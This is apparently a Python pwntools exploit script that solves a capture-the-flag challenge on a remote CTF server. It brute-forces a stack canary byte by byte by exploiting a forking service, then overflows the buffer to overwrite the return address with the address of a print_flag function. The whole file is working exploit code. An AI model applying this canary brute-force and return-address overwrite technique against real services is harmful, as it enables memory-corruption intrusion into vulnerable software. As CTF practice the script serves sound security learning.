from pwn import *

def canary_brute_force():
    i = -1
    x = 0
    payload = b'A'*8
    padding = b'A'*8
    print_flag_function_address  = p64(0x4012b6)
 
    p = remote("ctf.infinitylabs.co.il", 1231)
    print(p.recvline())
    p.sendline(b'-1')    #send -1 as an answer to the "how many cookies question", to get it to provide many forks so we can brute force the canary.
    while i < 255:
        p.recvuntil("Butter.\n")
        i += 1
        if x == 8:  #we brute forced 8 byte and got the canary.
            break
        p.send(payload + i.to_bytes(1,"little"))
        result = p.recv()
        print("x is ", x)
        if not b'*' in result:      #if ther's no "*"" that means we didn't get the stack smashing message' and we guest the current byte, so we add it to the payload and start brute force the next byte.
            payload += i.to_bytes(1,"little")
            i = -1  #initialize i back to -1 and then iterate again to brute force the next byte.
            x += 1
        print(payload)
    final_payload = payload + padding + print_flag_function_address  # padding to overwrite the base pointer, and then overwrite the return address(RIP) with the address of print_flag.
    print(final_payload)    
    p.send(final_payload)
    print(p.recvuntil("Butter.\n"))

canary_brute_force()
